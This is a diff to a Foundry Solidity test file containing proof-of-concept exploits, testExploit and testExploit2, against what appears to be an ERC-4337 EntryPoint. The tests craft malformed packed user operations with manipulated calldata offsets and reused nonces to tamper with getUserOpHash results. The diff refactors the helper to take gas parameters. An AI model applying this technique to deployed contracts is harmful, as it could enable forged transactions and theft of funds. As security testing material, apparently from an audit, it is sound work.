@@ -142,7 +142,15 @@ contract TestEntrypoint is Test {
     function testExploit() public {
         vm.deal(address(sender), 1 ether);
 
-        (,bytes memory data1) = packMaliciousUserOp(0, abi.encodeWithSelector(TestSender.execute.selector, eoaRecipient, 1, ""));
+        bytes memory data1 = packMaliciousUserOp(
+            0,
+            abi.encodeWithSelector(TestSender.execute.selector, eoaRecipient, 1, ""),
+            100000,
+            100000,
+            100000,
+            100000,
+            1
+        );
         // console.log("data");
         // console.logBytes(data);
         (bool success, bytes memory ret) = address(entrypoint).call(abi.encodePacked(entrypoint.getUserOpHash.selector, data1));
@@ -151,7 +159,15 @@ contract TestEntrypoint is Test {
         }
         console.log("hash1");
         console.logBytes(ret);
-        (, bytes memory data2) = packMaliciousUserOp(1, abi.encodeWithSelector(TestSender.execute.selector, eoaRecipient, 2, ""));
+        bytes memory data2 = packMaliciousUserOp(
+            1,
+            abi.encodeWithSelector(TestSender.execute.selector, eoaRecipient, 2, ""),
+            100000,
+            100000,
+            100000,
+            100000,
+            1
+        );
         (success, ret) = address(entrypoint).call(abi.encodePacked(entrypoint.getUserOpHash.selector, data2));
         if(!success) {
             console.log("error : ", string(ret));
@@ -177,7 +193,15 @@ contract TestEntrypoint is Test {
     function testExploit2() public {
         vm.deal(address(sender), 1 ether);
 
-        (uint256 length1, bytes memory data1) = packMaliciousUserOp(0, abi.encodeWithSelector(TestSender.execute.selector, eoaRecipient, 1, ""));
+        bytes memory data1 = packMaliciousUserOp(
+            0,
+            abi.encodeWithSelector(TestSender.execute.selector, eoaRecipient, 1, ""),
+            100000,
+            100000,
+            100000,
+            100000,
+            1
+        );
         // console.log("data");
         // console.logBytes(data);
         (bool success, bytes memory ret) = address(entrypoint).call(abi.encodePacked(entrypoint.getUserOpHash.selector, data1));
@@ -186,7 +210,15 @@ contract TestEntrypoint is Test {
         }
         console.log("hash1");
         console.logBytes(ret);
-        (uint256 length2, bytes memory data2) = packMaliciousUserOp(0, abi.encodeWithSelector(TestSender.execute.selector, eoaRecipient, 2, ""));
+        bytes memory data2 = packMaliciousUserOp(
+            0,
+            abi.encodeWithSelector(TestSender.execute.selector, eoaRecipient, 2, ""),
+            100000,
+            100000,
+            100000,
+            100000,
+            1
+        );
         (success, ret) = address(entrypoint).call(abi.encodePacked(entrypoint.getUserOpHash.selector, data2));
         if(!success) {
             console.log("error : ", string(ret));
@@ -210,9 +242,18 @@ contract TestEntrypoint is Test {
     }
 
 
-    function packMaliciousUserOp(uint256 _nonceDelta,bytes memory _data) public returns(uint256 origLength, bytes memory data) {
+    function packMaliciousUserOp(
+        uint256 _nonceDelta,
+        bytes memory _data,
+        uint256 _callgasLimit,
+        uint256 _verificationgasLimit,
+        uint256 _preverificationgas,
+        uint256 _maxfeepergas,
+        uint256 _maxpriorityfeepergas
+    ) public returns(bytes memory data) {
         uint256 offsetInitCode = 0x1e0;
         uint256 offsetCallData = 0x200;
+        uint256 offsetPaymasterAndData = 0x1f0;
         uint256 nonce = 0x160 + 0x60 + _nonceDelta;
         data = abi.encodePacked(
             uint256(32),
@@ -221,22 +262,30 @@ contract TestEntrypoint is Test {
             nonce, // nonce
             uint256(offsetInitCode),
             uint256(offsetCallData),
-            uint256(100000), // callgaslimit
-            uint256(100000), // verificationgaslimit
-            uint256(100000), // preverificationgas
-            uint256(100000), // maxfeepergas
-            uint256(1),   // maxpriorityfeepergas
-            uint256(0x1f0),
+            uint256(_callgasLimit), // callgaslimit
+            uint256(_verificationgasLimit), // verificationgaslimit
+            uint256(_preverificationgas), // preverificationgas
+            uint256(_maxfeepergas), // maxfeepergas
+            uint256(_maxpriorityfeepergas),   // maxpriorityfeepergas
+            uint256(offsetPaymasterAndData),
             uint256(32)
         );  // signature offset
         (address addr, uint256 priv) = makeAddrAndKey("senderOwner");
         console.log("TEST ACCOUNT", addr);
         console.log("owner :", sender.owner());
+        bytes memory empty = hex"";
         bytes32 hash = keccak256(
             abi.encodePacked(
                 address(sender),
                 uint256(nonce), // nonce
-                _data
+                empty,
+                _data,
+                _callgasLimit,
+                _verificationgasLimit,
+                _preverificationgas,
+                _maxfeepergas,
+                _maxpriorityfeepergas,
+                empty
             )
         );
         (uint8 v, bytes32 r, bytes32 s) = vm.sign(priv, hash.toEthSignedMessageHash());
